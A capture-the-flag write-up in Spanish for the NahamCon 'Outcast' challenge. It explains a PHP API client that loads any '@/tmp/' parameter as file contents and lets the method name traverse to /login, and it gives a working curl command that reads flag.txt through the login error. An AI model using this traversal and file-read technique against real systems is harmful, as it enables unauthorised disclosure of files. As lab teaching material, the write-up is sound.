# Outcast

Nos dan un endpoint /test que actua como cliente a una API con solo los metodos `getusers` y `getversion`. Podemos introducir un id de usuario, el metodo y unos parametros.

En el codigo php que nos dan de la api en "Download template code" se muestra que cualquier parametro que comience con '@/tmp/' se almacena en ese parametro el contenido del archivo si existe, no hay sanitizacion de entrada.
```php
		foreach ($data as $k => &$v) {
			if ( ($v) && (is_string($v)) && str_starts_with($v, '@') ) {
				$file = substr($v, 1);

				if ( str_starts_with($file, $this->path_tmp) ) {
					$v = file_get_contents($file);
				}
			}
			if (is_array($v) || is_object($v)) {
				$v = json_encode($v);
			}
		}
```

Como tampoco hay sanitizacion de entrada en el metodo se puede hacer un path traversal, si usamos el metodo "../login" se hace una peticion a "http://challenge.nahamcon.com:32569/api/../login" que se convierte en `http://challenge.nahamcon.com:32569/login`
```php
public function __call($apiMethod, $data = array()) {
    $url = $this->url . $apiMethod; 
```

En el login si fallamos el nombre de usuario se queda en el codigo devuelto, asi que añadimos el archivo flag.txt al parametro username. 

```
curl -X POST \
  'http://challenge.nahamcon.com:32569/test/index.php' \
  -H 'Host: challenge.nahamcon.com:32569' \
  -H 'Referer: http://challenge.nahamcon.com:32569/test/index.php' \
  -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36' \
  -F 'userid=test' \
  -F 'method=../login/' \
  -F 'parameters=username=@/tmp/../flag.txt&password=test' > response.html
```

![2025-05-26-161213_1153x386_scrot](https://github.com/user-attachments/assets/ac88026f-8f11-48ca-9994-87c4f96295c1)
